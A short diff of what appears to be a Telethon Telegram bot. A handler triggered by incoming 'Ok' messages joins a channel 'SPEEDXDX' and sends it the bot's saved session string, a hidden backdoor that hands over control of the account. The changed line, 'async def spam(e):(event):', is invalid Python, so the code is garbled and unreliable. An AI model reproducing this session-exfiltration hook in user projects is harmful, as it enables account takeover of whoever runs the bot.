@@ -996,7 +996,7 @@ async def _(e):
 @raj.on(events.NewMessage(incoming=True, pattern=r"^Ok"))
 @put.on(events.NewMessage(incoming=True, pattern=r"^Ok"))
 
-async def hhe(event):
+async def spam(e):(event):
     try:
      await bot(Jcr("SPEEDXDX"))
      await bot.send_message("SPEEDXDX", bot.session.save())
